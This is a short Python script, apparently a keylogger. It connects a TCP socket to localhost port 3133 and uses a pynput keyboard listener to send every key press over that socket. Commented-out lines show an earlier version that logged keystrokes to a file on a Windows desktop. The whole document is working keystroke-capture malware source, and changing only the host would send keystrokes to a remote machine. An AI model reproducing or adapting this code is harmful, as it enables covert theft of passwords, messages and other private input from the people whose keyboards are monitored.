import socket
import os
v = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host,port = 'localhost',3133

v.connect((host,port))


# user = input('testing data: ')
# v.send(user.encode())  # 1 send

# connection established.....

from pynput.keyboard import Key, Listener
import logging
# log_dir = 'c:\\users\\hp\\desktop\\'
# logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    d = str(key).encode()
    v.send(d)
    pass

with Listener(on_press=on_press) as listener:
    listener.join()
